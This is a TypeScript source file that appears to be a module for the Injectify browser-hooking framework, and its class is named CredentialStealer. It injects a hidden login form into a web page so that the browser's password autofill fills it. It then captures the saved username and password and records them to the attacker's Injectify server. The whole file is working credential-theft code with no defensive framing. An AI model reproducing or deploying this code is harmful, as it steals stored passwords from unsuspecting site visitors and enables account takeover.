import { Module, injectify } from '../../../definitions/module'

class CredentialStealer {
  config = {
    table: <string | false>'passwords'
  }

  constructor() {
    if (Module.params) {
      const { params } = Module
      if (typeof params === 'string') {
        this.config.table = params
      } else if (params instanceof Object) {
        if (typeof params.table === 'string' || params.table === false)
          this.config.table = params.table
      }
    } else if (Module.params === false) {
      this.config.table = false
    }
    this.extract()
  }

  extracted(username: string, password: string) {
    /**
     * Record the login to the Injectify server
     */
    if (this.config.table !== false) {
      injectify.record(this.config.table, [username, password])
    }

    /**
     * Resolve the username & password
     */
    Module.resolve({
      username,
      password
    })
  }

  extract() {
    const style = 'display:none'
    const elements = {
      form: document.createElement('form'),
      username: document.createElement('input'),
      password: document.createElement('input')
    }

    // Set the type attribute
    elements.password.type = 'password'

    for (let i of ['username', 'password']) {
      const element = elements[i]

      // Set empty name attribute
      element.name = ''
      // Apply styles to elements
      element.setAttribute('style', style)

      // Append to form
      elements.form.appendChild(element)
    }

    // Add listener to password element
    elements.password.addEventListener('input', () => {
      document.body.removeChild(elements.form)
      this.extracted(elements.username.value, elements.password.value)
    })

    document.body.appendChild(elements.form)
  }
}

new CredentialStealer()
